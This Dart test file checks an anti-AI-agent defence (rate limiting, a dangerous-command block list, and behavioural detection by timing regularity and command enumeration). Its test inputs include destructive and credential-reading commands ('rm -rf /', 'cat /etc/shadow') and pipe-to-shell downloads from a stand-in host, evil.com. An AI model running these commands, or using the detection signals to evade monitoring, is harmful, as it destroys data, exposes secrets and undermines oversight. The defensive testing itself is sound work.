// =============================================================
// TEST FIX-052 + FIX-053 : AI Detection (Rate Limiter + Behavioral)
// Verification du rate limiting anti-IA et de l'analyse comportementale
// =============================================================

import 'dart:collection';
import 'dart:math';
import 'package:test/test.dart';

// Reproduction des types pour les tests
enum RateLimitAction { allowed, slowdown, blocked }

class AIRateLimiter {
  final int slowdownThreshold;
  final int blockThreshold;
  final Duration window;
  final Map<String, List<DateTime>> _history = {};

  AIRateLimiter({
    this.slowdownThreshold = 10,
    this.blockThreshold = 50,
    this.window = const Duration(minutes: 1),
  });

  RateLimitAction check(String identifier) {
    final now = DateTime.now();
    final history = _history.putIfAbsent(identifier, () => []);
    history.removeWhere((t) => now.difference(t) > window);
    history.add(now);
    if (history.length > blockThreshold) {
      return RateLimitAction.blocked;
    } else if (history.length > slowdownThreshold) {
      return RateLimitAction.slowdown;
    }
    return RateLimitAction.allowed;
  }

  Duration getSlowdownDelay(String identifier) {
    final history = _history[identifier];
    if (history == null) return Duration.zero;
    final excess = history.length - slowdownThreshold;
    if (excess <= 0) return Duration.zero;
    return Duration(milliseconds: excess * 200);
  }

  void cleanup() {
    final now = DateTime.now();
    _history.forEach((key, history) {
      history.removeWhere((t) => now.difference(t) > window);
    });
    _history.removeWhere((_, history) => history.isEmpty);
  }
}

enum AnomalyAction { allow, warn, block }

bool isDangerousCommand(String cmd) {
  const dangerous = [
    'rm -rf', 'chmod 777', 'dd if=', 'mkfs.',
    'shutdown', 'reboot', 'cat /etc/shadow',
    'passwd', 'curl | sh', 'wget -O- | sh',
  ];
  return dangerous.any((d) => cmd.contains(d));
}

void main() {
  group('AIRateLimiter — Seuils progressifs', () {
    test('10 premieres requetes = allowed', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 10; i++) {
        expect(limiter.check('session1'), RateLimitAction.allowed);
      }
    });

    test('requete #11 = slowdown', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 10; i++) limiter.check('s1');
      expect(limiter.check('s1'), RateLimitAction.slowdown);
    });

    test('requete #51 = blocked', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 50; i++) limiter.check('s1');
      expect(limiter.check('s1'), RateLimitAction.blocked);
    });

    test('identifiants differents sont independants', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 30; i++) limiter.check('bot_session');
      // bot_session est en slowdown mais human_session est libre
      expect(limiter.check('human_session'), RateLimitAction.allowed);
    });
  });

  group('AIRateLimiter — Seuils configurables', () {
    test('seuils personnalises', () {
      final limiter = AIRateLimiter(
        slowdownThreshold: 5,
        blockThreshold: 15,
      );
      for (int i = 0; i < 5; i++) limiter.check('s1');
      expect(limiter.check('s1'), RateLimitAction.slowdown);

      for (int i = 0; i < 9; i++) limiter.check('s1');
      expect(limiter.check('s1'), RateLimitAction.blocked);
    });
  });

  group('AIRateLimiter — Slowdown delay', () {
    test('pas de delai sous le seuil', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 5; i++) limiter.check('s1');
      expect(limiter.getSlowdownDelay('s1'), Duration.zero);
    });

    test('delai proportionnel au depassement', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 15; i++) limiter.check('s1');
      final delay = limiter.getSlowdownDelay('s1');
      // 15 - 10 = 5 excess * 200ms = 1000ms
      expect(delay.inMilliseconds, 1000);
    });

    test('delai augmente avec plus de requetes', () {
      final limiter = AIRateLimiter();
      for (int i = 0; i < 20; i++) limiter.check('s1');
      final delay = limiter.getSlowdownDelay('s1');
      // 20 - 10 = 10 excess * 200ms = 2000ms
      expect(delay.inMilliseconds, 2000);
    });

    test('identifiant inconnu = delai zero', () {
      final limiter = AIRateLimiter();
      expect(limiter.getSlowdownDelay('unknown'), Duration.zero);
    });
  });

  group('Commandes dangereuses', () {
    test('rm -rf est dangereuse', () {
      expect(isDangerousCommand('rm -rf /'), isTrue);
    });

    test('chmod 777 est dangereuse', () {
      expect(isDangerousCommand('chmod 777 /etc'), isTrue);
    });

    test('cat /etc/shadow est dangereuse', () {
      expect(isDangerousCommand('cat /etc/shadow'), isTrue);
    });

    test('curl pipe sh est dangereux', () {
      expect(isDangerousCommand('curl http://evil.com | sh'), isTrue);
    });

    test('wget pipe sh est dangereux', () {
      expect(isDangerousCommand('wget -O- http://evil.com | sh'), isTrue);
    });

    test('dd if= est dangereux', () {
      expect(isDangerousCommand('dd if=/dev/zero of=/dev/sda'), isTrue);
    });

    test('ls est normal', () {
      expect(isDangerousCommand('ls -la'), isFalse);
    });

    test('cat normal est non dangereux', () {
      expect(isDangerousCommand('cat readme.txt'), isFalse);
    });

    test('ssh normal est non dangereux', () {
      expect(isDangerousCommand('ssh user@host'), isFalse);
    });
  });

  group('Patterns IA — Detection', () {
    test('variance timing < 50ms est suspect', () {
      // Simuler des intervalles tres reguliers (agent IA)
      final intervals = [100, 102, 99, 101, 100]; // ms
      final avg = intervals.reduce((a, b) => a + b) / intervals.length;
      final variance = intervals
          .map((i) => (i - avg) * (i - avg))
          .reduce((a, b) => a + b) / intervals.length;

      // Variance < 2500 (ecart type < 50ms) = suspect
      expect(variance, lessThan(2500));
    });

    test('variance timing humaine est > 50ms', () {
      // Intervalles humains (irreguliers)
      final intervals = [500, 1200, 300, 2500, 800]; // ms
      final avg = intervals.reduce((a, b) => a + b) / intervals.length;
      final variance = intervals
          .map((i) => (i - avg) * (i - avg))
          .reduce((a, b) => a + b) / intervals.length;

      expect(variance, greaterThan(2500));
    });

    test('enumeration systematique est suspecte (> 70%)', () {
      final cmds = ['ls /etc', 'cat /etc/passwd', 'find / -name *.key',
                     'grep -r password', 'head /etc/ssh/sshd_config',
                     'ls /root', 'tail /var/log/auth.log', 'cat /etc/hosts',
                     'find / -perm -4000', 'ls /tmp'];

      final enumCmds = ['ls', 'cat', 'find', 'grep', 'head', 'tail'];
      final enumCount = cmds
          .where((cmd) => enumCmds.any((e) => cmd.startsWith(e)))
          .length;

      final ratio = enumCount / cmds.length;
      expect(ratio, greaterThan(0.7));
    });

    test('usage normal ne declenche pas la detection', () {
      final cmds = ['ssh deploy@server', 'tailscale status',
                     'systemctl restart nginx', 'vim config.yaml',
                     'git pull', 'docker ps'];

      final enumCmds = ['ls', 'cat', 'find', 'grep', 'head', 'tail'];
      final enumCount = cmds
          .where((cmd) => enumCmds.any((e) => cmd.startsWith(e)))
          .length;

      final ratio = enumCount / cmds.length;
      expect(ratio, lessThan(0.7));
    });

    test('absence de pause > 5s est suspecte', () {
      // Simuler un agent IA : pas de pause > 5s
      final intervals = [200, 150, 300, 180, 220, 100, 250, 300, 190, 170];
      final hasPause = intervals.any((i) => i > 5000);
      expect(hasPause, isFalse);
      // => Suspect, score += 0.2
    });

    test('humain a des pauses > 5s', () {
      final intervals = [200, 150, 8000, 300, 12000, 500, 250];
      final hasPause = intervals.any((i) => i > 5000);
      expect(hasPause, isTrue);
    });
  });

  group('Anomaly scoring', () {
    test('score clampe entre 0.0 et 1.0', () {
      // Meme avec beaucoup d anomalies, le score ne depasse pas 1.0
      double score = 0.0;
      score += 0.5; // commande dangereuse
      score += 0.4; // timing regulier
      score += 0.3; // enumeration
      score += 0.2; // pas de pause
      score = score.clamp(0.0, 1.0);
      expect(score, 1.0);
    });

    test('score >= 0.7 = block', () {
      const score = 0.8;
      final action = score >= 0.7
          ? AnomalyAction.block
          : score >= 0.4
              ? AnomalyAction.warn
              : AnomalyAction.allow;
      expect(action, AnomalyAction.block);
    });

    test('score 0.4-0.7 = warn', () {
      const score = 0.5;
      final action = score >= 0.7
          ? AnomalyAction.block
          : score >= 0.4
              ? AnomalyAction.warn
              : AnomalyAction.allow;
      expect(action, AnomalyAction.warn);
    });

    test('score < 0.4 = allow', () {
      const score = 0.2;
      final action = score >= 0.7
          ? AnomalyAction.block
          : score >= 0.4
              ? AnomalyAction.warn
              : AnomalyAction.allow;
      expect(action, AnomalyAction.allow);
    });
  });
}
